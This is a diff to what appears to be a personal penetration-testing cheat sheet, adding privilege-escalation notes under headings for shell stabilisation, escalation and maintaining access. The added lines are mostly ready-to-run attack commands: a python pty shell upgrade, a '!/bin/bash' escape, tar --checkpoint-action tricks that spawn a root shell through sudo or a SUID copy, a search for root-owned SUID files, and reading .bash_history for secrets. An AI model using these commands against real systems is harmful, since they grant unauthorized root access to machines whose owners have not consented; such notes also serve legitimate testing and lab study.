@@ -8,11 +8,10 @@ OUPUT:
 - root Shell
 
 
-## Stablish Shell
+## Stablish Shell   
 [python]
 ```sh
-python3 -c 'import pty;pty.spawn("/bin/bash");'
-export TERM=xterm
+python3 -c 'import pty;pty.spawn("/bin/bash");'; export TERM=xterm
 ```
 
 ## Privilege Escalation
@@ -25,7 +24,13 @@ export TERM=xterm
 [Bash]  
 - [History] <cat .bash_history>
 [vsftpd]
+- !/bin/bash
+[tar]    
+    <sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh>
+    <sudo install -m =xs $(which tar)
+    ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh>
 
+find / -type f -user root -perm -u=s 2>/dev/null
 
 ## Maintain Access
 - PowerSploit
